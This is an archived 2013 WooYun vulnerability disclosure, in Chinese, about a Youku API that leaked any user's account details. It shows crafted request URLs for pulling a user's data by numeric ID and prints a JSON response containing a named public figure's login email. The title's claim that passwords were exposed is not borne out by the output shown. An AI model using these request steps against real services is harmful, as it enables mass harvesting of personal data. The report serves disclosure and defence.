<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		优酷某接口任意用户信息获取漏洞，可获取指定密码  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		优酷某接口任意用户信息获取漏洞，可获取指定密码  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/猪猪侠">猪猪侠</a> 
</li><li>提交时间：		2013-06-24 17:00</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2013-06-24：	细节已通知厂商并且等待厂商处理中<br/>
									2013-06-24：	厂商已经确认，细节仅向厂商公开<br/>
									2013-07-04：	细节向核心白帽子及相关领域专家公开<br/>
									2013-07-14：	细节向普通白帽子公开<br/>
									2013-07-24：	细节向实习白帽子公开<br/>
									2013-08-08：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">优酷系统的API，在输出用户信息时未进行严格的业务逻辑设计，直接输出了用户的邮箱、用户名、用户密码、用户登录IP、用户手机、QQ、MSN等敏感信息。</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">#1 访问老罗的个人主页<br />
<br />
</p><pre><code>http://i.youku.com/u/id_UMTcwMjk0NA==</code></pre><p class='detail'><br />
<br />
<br />
<br />
#2 个人主页页面会自动请求如下API，获取用户的个人主页访问量<br />
<br />
</p><pre><code>http://i.youku.com/user_pv/id_425736_md5_1e522f6831febf75e033cfe26fd0cec4_time_1372057646.html</code></pre><p class='detail'><br />
<br />
id_425736_md5，id后的数字为用户的个人真实ID<br />
<br />
<br />
<br />
# 构造请求获取用户数据<br />
<br />
</p><pre><code>http://i.youku.com/u/get_status?__rt=1&amp;__ro=&amp;uid=425736&amp;type=user_timeline&amp;page=1&amp;t=1372057786017&amp;size=10</code></pre><p class='detail'><br />
<br />
<br />
<br />
# 此处用测试帐号演示<br />
<br />
</p><p class="detail"><a href="../images/241653539943e8944d59d410f53e206aa4159df0.png" target="_blank"><img src="../images/241653539943e8944d59d410f53e206aa4159df0.png" alt="youku.png" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/2416540748b049b885be8f53827d25254a016522.png" target="_blank"><img src="../images/2416540748b049b885be8f53827d25254a016522.png" alt="youkupa.png" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
</p><pre><code>{&quot;userId&quot;:&quot;425736&quot;,&quot;userName&quot;:&quot;\u8001\u7f57&quot;,&quot;name&quot;:null,&quot;regDate&quot;:&quot;2006-11-04 10:06:54&quot;,&quot;contentTotal&quot;:&quot;28&quot;,&quot;scoreTotal&quot;:&quot;380&quot;,&quot;favTotal&quot;:&quot;0&quot;,&quot;friendTotal&quot;:&quot;0&quot;,&quot;pkTotal&quot;:&quot;3091716&quot;,&quot;clubTotal&quot;:&quot;0&quot;,&quot;gender&quot;:&quot;0&quot;,&quot;city&quot;:&quot;1&quot;,&quot;birthDay&quot;:&quot;0000-00-00&quot;,&quot;birthDayDesc&quot;:&quot;\u65e0\u678160&quot;,&quot;icon&quot;:&quot;100&quot;,&quot;pvTotal&quot;:&quot;391291&quot;,&quot;orderBy&quot;:null,&quot;lastLoginDate&quot;:&quot;2006-11-04 10:06:54&quot;,&quot;lastLoginDateDesc&quot;:&quot;6\u5e74\u524d&quot;,&quot;statValue&quot;:null,&quot;subTotal&quot;:null,&quot;userSet&quot;:&quot;23&quot;,&quot;email&quot;:&quot;laol@youku.com&quot;,&quot;returnType&quot;:null,&quot;icon64&quot;:&quot;&quot;,&quot;icon150&quot;:&quot;&quot;,&quot;iconUpdateTime&quot;:null,&quot;contentFavTotal&quot;:&quot;13159&quot;,&quot;ecdUserId&quot;:&quot;UMTcwMjk0NA==&quot;,&quot;genderDesc&quot;:&quot;\u7537&quot;,&quot;cityDesc&quot;:&quot;\u5317\u4eac\u5e02&quot;,&quot;QQ&quot;:&quot;&quot;,&quot;MSN&quot;:&quot;&quot;,&quot;intro&quot;:&quot;&quot;,&quot;status&quot;:&quot;1&quot;,&quot;contentPvTotal&quot;:&quot;15564997&quot;,&quot;messageTotal&quot;:&quot;0&quot;,&quot;subscribeTotal&quot;:&quot;0&quot;,&quot;folderTotal&quot;:&quot;1&quot;,&quot;folderPvTotal&quot;:0},&quot;info&quot;:{&quot;email_status&quot;:0,&quot;uid&quot;:425736,&quot;reason&quot;:null,&quot;status&quot;:0,&quot;nickname&quot;:&quot;\u8001\u7f57&quot;,&quot;bflag&quot;:0,&quot;from&quot;:null,&quot;nameCheckStatus&quot;:0,&quot;ctime&quot;:1319188273080,&quot;username&quot;:&quot;\u8001\u7f57&quot;,&quot;email&quot;:&quot;laol@youku.com&quot;,&quot;domain&quot;:&quot;&quot;,&quot;tmpEmail&quot;:&quot;&quot;,&quot;oldUsername&quot;:null,&quot;login&quot;:1371969255588,&quot;nameVersion&quot;:0,&quot;mobile&quot;:&quot;&quot;},&quot;verified_icon&quot;:1,&quot;encode_id&quot;:&quot;UMTcwMjk0NA==&quot;,&quot;is_self&quot;:false,&quot;login_user_id&quot;:&quot;65214337&quot;,&quot;login_user_encode_id&quot;:&quot;UMjYwODU3MzQ4&quot;,&quot;it&quot;:&quot;\u4ed6&quot;,&quot;is_official&quot;:false,&quot;rolltips&quot;:0,&quot;firstrunGuide&quot;:1,&quot;firstrunGuidee&quot;:2,&quot;firstrunGuideee&quot;:0,&quot;favtips&quot;:0,&quot;canuseboard&quot;:1,&quot;canusebanner&quot;:1,&quot;board&quot;:{&quot;state&quot;:0,&quot;content&quot;:&quot;&quot;},&quot;mod&quot;:{&quot;m_headline&quot;:1,&quot;m_video&quot;:1,&quot;m_playlist&quot;:1,&quot;m_favorite&quot;:1,&quot;m_statuses&quot;:1,&quot;m_user&quot;:1,&quot;m_guestbook&quot;:1,&quot;m_friend&quot;:1,&quot;m_follower&quot;:1,&quot;m_visitor&quot;:1,&quot;id&quot;:425736,&quot;m_address&quot;:1},&quot;pvtime&quot;:1372064276,&quot;pvmd5&quot;:&quot;79cdb02deead4aede3cf7c4fa8547ac7&quot;}}</code></pre><p class='detail'> </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail">获得罗永浩的登录邮箱为：laol@youku.com </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">不该输出的信息还是尽量不要输出。  </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/猪猪侠" title="猪猪侠">猪猪侠</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-026787" title="优酷某接口任意用户信息获取漏洞，可获取指定密码">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：高</p>
						<p class="detail">漏洞Rank：20 </p>
													<p class="detail">确认时间：2013-06-24 17:09</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">修复中</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="26787";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
